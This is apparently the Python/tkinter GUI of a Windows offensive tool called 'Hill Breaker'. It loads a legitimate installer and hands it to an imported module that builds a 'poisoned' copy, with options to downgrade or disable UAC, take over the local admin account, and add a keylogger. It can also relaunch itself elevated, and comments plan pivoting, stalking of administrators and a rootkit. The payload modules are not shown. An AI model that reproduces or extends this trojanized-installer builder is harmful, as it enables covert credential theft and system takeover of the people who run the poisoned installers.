#This is probably the worst python/tkinter code ever written. I hate UI code(and its probably not its fault).
import tkinter
from tkinter import *
from tkinter import ttk, filedialog #.ttk and tkinter widgets are diffrent, headache
import Jacker, LightspeedOff, poisonRecipe
from ctypes import windll
from sys import executable, argv
from os import getlogin

c = (windll.shell32)

windll.shcore.SetProcessDpiAwareness(1) #Blurry fonts - https://stackoverflow.com/questions/41315873

class Methods():
    def __init__(self) :
        self.installer = ""
    #Upload a file to poisoner
    def Upload():
        Methods.installer = filedialog.askopenfilename()
        selected.config(text=Methods.installer)

    #Elevate Hill breaker
    def Elevate():
        c.ShellExecuteW(None, 'runas', executable, ' '.join(argv), None, None) # Creates new program, BUT DOESNT STOP OLD ONE
        if c.IsUserAnAdmin():
            quit() # After new elevated script is running, Keep Yourself Safe #03
        else:
            tkinter.messagebox.showerror(title='Hill Breaker', message='Failed to elevate program.')

    #Create poisoned file
    def Create():
        Jacker.PoisonBottle(Methods.installer, includeUACdowngrade.get(), includeUACdisable.get(), includePWNadmin.get(), includeKeylog.get())

#Hill Breaker

root = tkinter.Tk()
root.title("Hill Breaker")

tab = ttk.Notebook(root)

#Tabs
home = Frame(tab,padx=10,pady=10,bg='#999999')
hijacking = Frame(tab,padx=10,pady=10,bg='#999999')
controls = Frame(tab,padx=10,pady=10,bg='#999999')

tab.add(home, text='Home')
tab.add(hijacking, text='Hijacking')
tab.add(controls, text='Controls')

tab.pack(expand=1, fill='both')

#Home
admin = LabelFrame(home,text="Elevation Status",padx=10,pady=10,bg='#888888',borderwidth=5)
status = Label(admin,text="Program is not currently elevated.",bg='#888888')
elevate = Button(admin,text="Elevate",command=lambda : Methods.Elevate(),borderwidth=5)

if c.IsUserAnAdmin(): # Can probably do this all with a text variable and returns and blah blah
    status.config(text="Program is running as elevated under " + getlogin()) # Probably better to just not do this in python
    elevate.config(disabled=1)

status.pack(anchor='nw')
admin.pack(anchor='nw')



#Hijacker - Create fake installers, etc
uploader = LabelFrame(hijacking,text="Create Installer",padx=10,pady=10,bg='#888888',borderwidth=5)
info = Label(uploader,text="Upload installer file to create poisoned copy.",bg='#888888')

poisonOptions = LabelFrame(hijacking,text="Options",padx=10,pady=10,bg='#888888',borderwidth=5)
selected = Label(poisonOptions,text=("No file selected."),bg='#888888')

includeUACdowngrade = IntVar()
includeUACdisable = IntVar()
includePWNadmin = IntVar()
includeKeylog = IntVar()

downgradeUAC = Checkbutton(poisonOptions,text="Downgrade UAC",bg='#888888',variable=includeUACdowngrade)
disableUAC = Checkbutton(poisonOptions,text="Disable UAC",bg='#888888',variable=includeUACdisable)
pwnadmin = Checkbutton(poisonOptions,text="Pwn Local Admin",bg='#888888',variable=includePWNadmin)
keylog = Checkbutton(poisonOptions,text="Keylog",bg='#888888',variable=includeKeylog)

uploadfile = Button(uploader,text="Upload file",command=lambda : Methods.Upload(),borderwidth=5)
create = Button(poisonOptions,text="Create",command=lambda : Methods.Create(),borderwidth=5)

info.pack(anchor='nw')
elevate.pack(anchor='nw')          
uploadfile.pack(anchor='nw')
uploader.pack(anchor='nw')
selected.pack(anchor='nw')
poisonOptions.pack(anchor='nw')
downgradeUAC.pack(anchor='nw')
disableUAC.pack(anchor='nw')
pwnadmin.pack(anchor='nw')
keylog.pack(anchor='nw')
create.pack(anchor='nw')

#Controller - Control local system, disable UAC, etc. from a pivot

#Stalker - "stalk" admins and admin logs, i.e "tdoyle has logged in at __" "cevans has done __"

#Roots - Rootkit when?

root.mainloop()